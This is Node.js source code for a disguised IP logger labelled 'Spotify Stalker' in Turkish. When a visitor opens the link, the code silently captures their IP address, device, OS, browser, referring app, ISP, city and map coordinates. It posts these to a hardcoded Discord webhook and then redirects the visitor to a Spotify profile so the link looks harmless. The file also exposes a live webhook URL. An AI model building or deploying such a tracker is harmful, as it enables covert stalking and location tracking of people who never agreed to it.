const express = require('express');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? require('https') : require('http');
    mod.get(url, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
    }).on('error', reject);
  });
}

function postJSON(url, payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const u = new URL(url);
    const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } };
    const req = https.request(opts, () => resolve());
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function codeToFlag(code) {
  if (!code || code.length !== 2) return '';
  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65, 0x1F1E6 + code.charCodeAt(1) - 65);
}

function parseUA(ua) {
  let os = 'Bilinmiyor', browser = 'Bilinmiyor', device = '-', app = 'Doğrudan / Bilinmiyor';
  if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
  else if (/Instagram/i.test(ua)) app = 'Instagram';
  else if (/FBAN|FBAV|Facebook/i.test(ua)) app = 'Facebook';
  else if (/Messenger/i.test(ua)) app = 'Facebook Messenger';
  else if (/Telegram/i.test(ua)) app = 'Telegram';
  else if (/Twitter|Tweetbot/i.test(ua)) app = 'Twitter/X';
  else if (/Discord/i.test(ua)) app = 'Discord';
  else if (/LinkedIn/i.test(ua)) app = 'LinkedIn';
  else if (/Snapchat/i.test(ua)) app = 'Snapchat';
  else if (/TikTok/i.test(ua)) app = 'TikTok';
  else if (/Reddit/i.test(ua)) app = 'Reddit';
  else if (/okhttp/i.test(ua)) app = 'Android Uygulama';
  if (/iPhone/i.test(ua)) { device = 'iPhone'; os = 'iOS'; }
  else if (/iPad/i.test(ua)) { device = 'iPad'; os = 'iOS'; }
  else if (/Android/i.test(ua)) device = /Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet';
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10';
  else if (/Windows NT 11/i.test(ua)) os = 'Windows 11';
  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
  else if (/Windows NT 6\.2/i.test(ua)) os = 'Windows 8';
  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
  else if (/Mac OS X (\d+[._]\d+)/.test(ua)) os = 'macOS ' + RegExp.$1.replace('_', '.');
  else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = 'Linux';
  if (device === '-' && os !== 'Bilinmiyor') device = 'PC';
  if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) { let m = ua.match(/Chrome\/([\d.]+)/); browser = 'Chrome ' + (m ? m[1] : ''); }
  else if (/Firefox/i.test(ua)) { let m = ua.match(/Firefox\/([\d.]+)/); browser = 'Firefox ' + (m ? m[1] : ''); }
  else if (/Edg/i.test(ua)) { let m = ua.match(/Edg\/([\d.]+)/); browser = 'Edge ' + (m ? m[1] : ''); }
  else if (/OPR/i.test(ua)) { let m = ua.match(/OPR\/([\d.]+)/); browser = 'Opera ' + (m ? m[1] : ''); }
  else if (/Safari/i.test(ua)) { let m = ua.match(/Version\/([\d.]+)/); browser = 'Safari ' + (m ? m[1] : ''); }
  return { os, browser, device, app };
}

function fmtDate(d) {
  return String(d.getDate()).padStart(2,'0')+'.'+String(d.getMonth()+1).padStart(2,'0')+'.'+d.getFullYear()+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
}

function relDate(d) {
  const n = new Date();
  const h = String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
  if (n-d < 86400000 && d.getDate()===n.getDate()) return 'bugün '+h;
  const y = new Date(n); y.setDate(y.getDate()-1);
  if (d.getDate()===y.getDate()&&d.getMonth()===y.getMonth()&&d.getFullYear()===y.getFullYear()) return 'dün '+h;
  return fmtDate(d);
}

app.get('/', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const uaStr = req.headers['user-agent'] || '';
    const referrer = req.headers['referer'] || '';
    const { os, browser, device, app: detectedApp } = parseUA(uaStr);
    const source = detectedApp !== 'Doğrudan / Bilinmiyor' ? detectedApp : (referrer || 'Doğrudan / Bilinmiyor');
    let geo = {};
    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
    const flag = codeToFlag(geo.countryCode);
    const konum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
    const mapsLink = geo.lat ? 'https://www.google.com/maps?q='+geo.lat+','+geo.lon : '';
    const now = new Date();
    const fields = [
      { name: ':round_pushpin: Konum', value: flag+' '+konum+(mapsLink ? '\n[Haritada göster]('+mapsLink+')' : ''), inline: true },
      { name: ':id: IP', value: ip, inline: true },
      { name: ':mobile_phone: Cihaz', value: device, inline: true },
      { name: ':desktop: İşletim Sistemi', value: os, inline: true },
      { name: ':globe_with_meridians: Tarayıcı', value: browser, inline: true },
      { name: ':satellite: ISS', value: geo.isp || geo.org || 'Bilinmiyor', inline: true },
      { name: ':link: Yönlendiren', value: source, inline: true },
      { name: ':alarm_clock: Tarih', value: fmtDate(now), inline: true }
    ];
    await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 '+relDate(now) } }] });
  } catch(e) {}
  res.redirect(REDIRECT);
});

app.listen(PORT, () => console.log('Server running on port '+PORT));
